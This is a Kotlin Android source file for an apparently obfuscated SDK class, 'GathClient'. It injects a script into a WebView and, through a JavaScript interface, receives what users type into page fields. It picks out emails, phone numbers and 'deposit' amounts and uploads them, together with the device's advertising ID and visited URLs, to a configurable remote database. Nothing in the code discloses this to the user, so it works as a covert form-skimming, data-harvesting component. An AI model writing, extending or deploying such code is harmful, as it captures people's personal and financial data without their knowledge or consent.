package io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902

import android.content.Context
import android.util.Log
import android.webkit.JavascriptInterface
import android.webkit.WebView
import androidx.lifecycle.DefaultLifecycleObserver
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import com.android.volley.toolbox.Volley
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.common.Input
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.common.MatcherOperations
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.common.TimerPool
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.common.config.GathClientConfig
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.common.firebase.Crashlog
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.source.local.preferences.AppStoragePreferencesDataStore
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.source.local.preferences.UserStoragePreferencesDataStore
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.source.local.repo.AppStoragePreferencesRepositoryImpl
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.source.local.repo.UserStoragePreferencesRepositoryImpl
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.source.remote.RequestManager
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.domain.GathClientInterface
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.domain.user.GathUserInterface
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.domain.user.StartGathUserInterface
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.utils.Const
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.utils.enums.UploadDataType
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.utils.extension.scope
import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfustringThis
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.IOException

@ObfustringThis
class GathClient(
	private val lifecycleOwner: LifecycleOwner,
	private val webView: WebView
) : DefaultLifecycleObserver, LifecycleOwner, GathClientInterface, GathUserInterface,
	StartGathUserInterface {
	val context: Context = webView.context
	private val timerPool: TimerPool = TimerPool(lifecycle)
	private val manager: GathManager = GathManager(
		AppStoragePreferencesRepositoryImpl(
			AppStoragePreferencesDataStore(
				context.applicationContext
			)
		),
		UserStoragePreferencesRepositoryImpl(
			UserStoragePreferencesDataStore(
				context.applicationContext
			)
		)
	)

	private val input = object : Input() {
		@JavascriptInterface
		override fun sendText(
			id: String,
			name: String,
			type: String,
			outerHTML: String,
			value: String,
		) {

			val textId = "$id$name$type$outerHTML"

			timerPool.addTemp(textId) {
				scope {
					manager.sendText(
						id = textId,
						value = value,
						emailMatches = { clearEmail, type ->
							MatcherOperations.Format.formatEmail(clearEmail) { formatEmail ->
								addToTimerPool(formatEmail, type)
							}
						},
						phoneMatches = { clearPhone, type ->
							val codes = context.resources.getStringArray(R.array.phoneCode)

							scope {
								MatcherOperations.Format.formatPhone(
									clearPhone, manager.getCountryCode(), codes
								) { formatPhone ->
									addToTimerPool(formatPhone, type)
								}
							}
						},
						depositMatches = { clearDeposit, type ->
							addToTimerPool(clearDeposit, type)
						},
					)
				}
			}
		}
	}

	init {
		lifecycle.addObserver(this)
	}

	override fun onDestroy(owner: LifecycleOwner) {
		super.onDestroy(owner)
		detachInputListener()
		lifecycle.removeObserver(this)
	}

	override fun getLifecycle(): Lifecycle {
		return lifecycleOwner.lifecycle
	}

	override fun attachInputListener() {
		webView.addJavascriptInterface(input, Input::class.java.simpleName)
	}

	override fun detachInputListener() {
		webView.removeJavascriptInterface(Input::class.java.simpleName)
	}

	override suspend fun getGoogleAdvertisingId(): String? {
		return withContext(Dispatchers.IO) {
			try {
				AdvertisingIdClient.getAdvertisingIdInfo(context).id.toString()
			} catch (e: IOException) {
				Log.e(
					"StartGathClient",
					"googleAdvertisingId IOException: $e"
				)
				Crashlog.record(e)
				null
			} catch (e: IllegalStateException) {
				Log.e("StartGathClient", "googleAdvertisingId IllegalStateException: ${e.message}")
				Crashlog.record(e)
				null
			} catch (e: GooglePlayServicesNotAvailableException) {
				Log.e(
					"StartGathClient",
					"googleAdvertisingId GooglePlayServicesNotAvailableException: ${e.message}"
				)
				Crashlog.record(e)
				null
			} catch (e: GooglePlayServicesRepairableException) {
				Log.e(
					"StartGathClient",
					"googleAdvertisingId GooglePlayServicesRepairableException: ${e.message}"
				)
				null
			} catch (e: Exception) {
				Log.e("StartGathClient", "googleAdvertisingId Exception: ${e.message}")
				Crashlog.record(e)
				null
			}
		}
	}

	override fun sendURL(url: String) {
		scope {
			manager.sendInitData(getGoogleAdvertisingId(), url)
		}
	}

	override fun start(): GathClient {
		scope {
			manager.checkAvailability {
				attachInputListener()
				fetchCountryCode()
			}
		}
		return this
	}


	override fun setup(block: GathClientConfig.() -> Unit): GathClient {
		scope {
			GathClientConfig().apply(block).apply {
				manager.emailCollectingEnabled = isEmailCollect
				manager.phoneCollectingEnabled = isPhoneCollect
				manager.depositCollectingEnabled = isDepositCollect
				manager.customDatabaseURL(databaseUrl)
			}
		}
		return this
	}


	override fun evaluateJavascript(view: WebView?) {
		view?.evaluateJavascript(Const.DEFAULT_SCRIPT) { }
	}

	override fun evaluateJavascript(view: WebView?, script: String) {
		view?.evaluateJavascript(script) {}
	}

	private fun addToTimerPool(data: Any, type: UploadDataType) {
		timerPool.add(type) {
			scope {
				manager.uploadData(
					uploadKey = type,
					data = data
				)
			}
			Log.i("GathClient", "matches -> ${type.name}: $data")
		}
	}

	private fun fetchCountryCode() {
		RequestManager().createCountryCodeRequest { countryCode ->
			scope {
				manager.countryCode(countryCode)
			}
		}.also {
			Volley.newRequestQueue(context).add(it)
		}
	}
}